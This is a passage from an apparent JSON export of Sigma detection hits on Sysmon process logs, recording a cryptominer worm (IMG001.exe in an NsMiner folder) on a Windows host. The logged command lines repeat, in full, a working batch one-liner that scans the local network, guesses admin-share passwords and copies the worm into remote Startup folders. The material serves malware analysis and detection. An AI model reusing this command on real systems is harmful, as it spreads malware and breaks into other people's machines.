/delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-7506-000000003B00}; ProcessId=8016; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08A-6560-7406-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7276; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  view \\\\192.168.2.117; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c net view \\\\192.168.2.117|find /i \"    \"; UtcTime=1700839562; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "e77646c39db7fa011a5223aeb73c738046787fc7f62a99394e883d76a54341f7",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CMD Shell Output Redirect",
                                                                       "rule_description":  "Detects the use of the redirection character \"\u003e\" to redicrect information in commandline",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07E-6560-3706-000000003B00}; ProcessId=7868; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839550; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4506-000000003B00}; ProcessId=8124; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; ProcessId=7380; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-7806-000000003B00}; ProcessId=2032; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\192.168.2.42\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\192.168.2.42\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-7A06-000000003B00}; ProcessId=7932; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C083-6560-4506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8124; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\192.168.2.90\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\192.168.2.90\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839562; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
